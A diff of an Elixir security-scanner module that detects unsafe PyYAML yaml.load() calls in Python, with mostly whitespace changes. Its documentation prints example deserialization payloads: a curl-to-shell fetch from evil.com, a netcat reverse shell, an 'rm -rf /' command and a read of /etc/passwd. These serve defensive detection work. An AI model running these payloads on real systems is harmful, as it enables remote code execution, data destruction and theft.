@@ -1,7 +1,7 @@
 defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
   @moduledoc """
   Pattern for detecting unsafe YAML loading in Python code.
-  
+
   Detects usage of yaml.load() without SafeLoader which can execute arbitrary code.
   This is a critical vulnerability that has been exploited in multiple CVEs.
   """
@@ -10,9 +10,9 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
 
   @doc """
   Returns the complete pattern for detecting unsafe YAML loading.
-  
+
   ## Examples
-  
+
       iex> pattern = Rsolv.Security.Patterns.Python.UnsafeYamlLoad.pattern()
       iex> pattern.id
       "python-unsafe-yaml-load"
@@ -134,20 +134,20 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
       vulnerable: %{
         "Basic unsafe load" => """
         import yaml
-        
+
         # This allows arbitrary code execution
         config = yaml.load(user_provided_yaml)
         """,
         "Loading from file" => """
         import yaml
-        
+
         with open('user_upload.yml', 'r') as f:
             # Dangerous if file content is not trusted
             data = yaml.load(f)
         """,
         "Using FullLoader" => """
         import yaml
-        
+
         # FullLoader is still unsafe for untrusted data
         settings = yaml.load(config_string, Loader=yaml.FullLoader)
         """
@@ -155,19 +155,19 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
       fixed: %{
         "Use safe_load" => """
         import yaml
-        
+
         # safe_load only constructs simple Python objects
         config = yaml.safe_load(user_provided_yaml)
         """,
         "Use SafeLoader explicitly" => """
         import yaml
-        
+
         # Explicitly specify SafeLoader
         data = yaml.load(user_input, Loader=yaml.SafeLoader)
         """,
         "Validate and use JSON" => """
         import json
-        
+
         # JSON is safe by default
         config = json.loads(user_provided_json)
         """
@@ -196,28 +196,28 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
     YAML deserialization in Python using yaml.load() can execute arbitrary code.
     This is not a bug but a feature of YAML that allows it to instantiate any
     Python object, including those that execute code upon creation.
-    
+
     ## Attack Mechanism
-    
+
     1. **Object Instantiation**: YAML can create any Python object using tags
     2. **Code Execution**: Objects can execute code in __init__ or __reduce__
     3. **System Compromise**: Attackers can run OS commands, read files, etc.
-    
+
     ## Example Attack Payload
-    
+
     ```yaml
     !!python/object/apply:os.system
     args: ['rm -rf /']
     ```
-    
+
     ## Real CVE Examples
-    
+
     - **CVE-2020-14343**: PyYAML vulnerability allowing arbitrary code execution
     - **CVE-2019-20477**: PyYAML vulnerability in versions before 5.2
     - **CVE-2020-1747**: PyYAML vulnerability allowing arbitrary command execution
-    
+
     ## Safe Alternatives
-    
+
     - **yaml.safe_load()**: Only loads standard YAML tags (strings, lists, dicts)
     - **yaml.load(data, Loader=yaml.SafeLoader)**: Explicit safe loader
     - **JSON**: Consider JSON for data that doesn't need YAML features
@@ -227,7 +227,7 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
 
   @doc """
   Comprehensive vulnerability metadata for unsafe YAML deserialization in Python.
-  
+
   This metadata documents the critical security implications of using yaml.load()
   without SafeLoader, which allows arbitrary code execution through object deserialization.
   """
@@ -239,30 +239,30 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
       applications. This is not a bug but a documented feature of YAML that allows 
       instantiation of arbitrary Python objects, including those that execute code 
       upon creation.
-      
+
       The vulnerability occurs because:
       1. YAML supports complex object serialization through tags (e.g., !!python/object)
       2. yaml.load() with default or FullLoader will instantiate these objects
       3. Python objects can execute code in __init__, __reduce__, or __setstate__
       4. Attackers can craft YAML payloads that execute system commands
-      
+
       Attack payload examples:
       ```yaml
       # Execute system command
       !!python/object/apply:os.system
       args: ['curl evil.com/shell.sh | sh']
-      
+
       # Create reverse shell
       !!python/object/apply:subprocess.Popen
       args:
         - ['nc', '-e', '/bin/sh', '10.0.0.1', '4444']
-      
+
       # Read sensitive files
       !!python/object/new:subprocess.check_output
       args:
         - ['cat', '/etc/passwd']
       ```
-      
+
       PyYAML versions before 5.4 had multiple bypass vulnerabilities even when
       attempting to use "safe" loaders, making this a persistent threat.
       """,
@@ -295,7 +295,8 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
           type: :research,
           id: "exploit_db_yaml",
           title: "YAML Deserialization Attack in Python - Exploit Database",
-          url: "https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf"
+          url:
+            "https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf"
         }
       ],
       attack_vectors: [
@@ -350,12 +351,12 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
       ],
       detection_notes: """
       This pattern detects unsafe YAML loading through:
-      
+
       1. Direct yaml.load() calls without SafeLoader
       2. yaml.load() with FullLoader (still vulnerable)
       3. Imported load function used without safe parameters
       4. Legacy patterns that default to unsafe loading
-      
+
       The pattern does not match:
       - yaml.safe_load() usage
       - yaml.load() with Loader=yaml.SafeLoader
@@ -409,9 +410,9 @@ defmodule Rsolv.Security.Patterns.Python.UnsafeYamlLoad do
 
   @doc """
   Returns AST enhancement rules for improved detection.
-  
+
   ## Examples
-  
+
       iex> enhancement = Rsolv.Security.Patterns.Python.UnsafeYamlLoad.ast_enhancement()
       iex> Map.keys(enhancement) |> Enum.sort()
       [:ast_rules, :min_confidence]
